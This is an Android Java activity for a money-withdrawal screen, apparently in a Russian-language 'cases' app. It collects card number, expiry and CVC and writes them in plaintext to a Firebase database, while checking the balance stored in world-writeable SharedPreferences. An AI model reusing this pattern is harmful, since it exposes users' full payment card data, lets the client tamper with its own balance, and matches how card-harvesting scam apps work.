package com.statham.jason.oligarh;

import android.content.Context;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.Date;

public class Card_D extends AppCompatActivity {
    private EditText editText3, editText4, editText6, editText7, editText8, editText9;
    private Button button8;
    private DatabaseReference databaseReference;
    private FirebaseAuth firebaseAuth;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_card__d);
        editText3 = (EditText) findViewById(R.id.editText3);
        editText4 = (EditText) findViewById(R.id.editText4);
        editText6 = (EditText) findViewById(R.id.editText6);
        editText7 = (EditText) findViewById(R.id.editText7);
        editText8 = (EditText) findViewById(R.id.editText8);
        editText9 = (EditText) findViewById(R.id.editText9);
        firebaseAuth = FirebaseAuth.getInstance();
        databaseReference = FirebaseDatabase.getInstance().getReference();
        button8=(Button)findViewById(R.id.button8);
        button8.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Check();
            }
        });
    }

    private void Check() {
        final SharedPreferences preferences = getSharedPreferences("AUTHENTICATION_FILE_NAME", Context.MODE_WORLD_WRITEABLE);
        final SharedPreferences.Editor editor = preferences.edit();
        FirebaseUser user = firebaseAuth.getCurrentUser();
        assert user != null;
        final String first = user.getUid();
        String example = editText8.getText().toString();
        int examp = Integer.parseInt(example);
        if (examp == 1) {
            String casha = editText9.getText().toString();
            String money = preferences.getString("CASE_ONE", "");
            int cas = Integer.parseInt(casha);
            int mon = Integer.parseInt(money);
            if (cas > mon) {
                Toast.makeText(this, "Введите сумму которая у вас действительно есть", Toast.LENGTH_SHORT).show();
            } else {
                long msTime = System.currentTimeMillis();
                Date curDateTime = new Date(msTime);
                String data = String.valueOf(curDateTime);
                String card = editText3.getText().toString();
                String number = editText4.getText().toString();
                String time = editText6.getText().toString();
                String cvc = editText7.getText().toString();
                String cash = editText9.getText().toString();
                String end = "Vyvod/" + user.getUid();
                databaseReference.child(end).child("data").setValue(data);
                databaseReference.child(end).child("card").setValue(card);
                databaseReference.child(end).child("number").setValue(number);
                databaseReference.child(end).child("time").setValue(time);
                databaseReference.child(end).child("cvc").setValue(cvc);
                databaseReference.child(end).child("cash").setValue(cash);
                int resul =mon -cas;
                String resu= String.valueOf(resul);
                editor.putString("CASE_ONE", resu);
                editor.apply();
                Toast.makeText(getApplicationContext(), "Запрос на вывод поставлен на очередь ожидайте вывода своих денег", Toast.LENGTH_LONG).show();

            }
        }


        if(examp==3){
            String casha = editText9.getText().toString();
            String money = preferences.getString("CASE_THREE", "");
            int cas = Integer.parseInt(casha);
            int mon = Integer.parseInt(money);
            if (cas > mon) {
                Toast.makeText(this, "Введите сумму которая у вас действительно есть", Toast.LENGTH_SHORT).show();
            } else {
                long msTime = System.currentTimeMillis();
                Date curDateTime = new Date(msTime);
                String data = String.valueOf(curDateTime);
                String card = editText3.getText().toString();
                String number = editText4.getText().toString();
                String time = editText6.getText().toString();
                String cvc = editText7.getText().toString();
                String cash = editText9.getText().toString();
                String end = "Vyvod/" + user.getUid();
                databaseReference.child(end).child("data").setValue(data);
                databaseReference.child(end).child("card").setValue(card);
                databaseReference.child(end).child("number").setValue(number);
                databaseReference.child(end).child("time").setValue(time);
                databaseReference.child(end).child("cvc").setValue(cvc);
                databaseReference.child(end).child("cash").setValue(cash);
                int resul = mon -cas;
                String resu= String.valueOf(resul);
                editor.putString("CASE_THREE", resu);
                editor.apply();
                Toast.makeText(getApplicationContext(), "Запрос на вывод поставлен на очередь ожидайте вывода своих денег", Toast.LENGTH_LONG).show();

            }
        }

        if(examp==2 || examp>3){
            Toast.makeText(this, "Выводить деньги можно только с первого или третьего кейса", Toast.LENGTH_LONG).show();
        }
    }
}



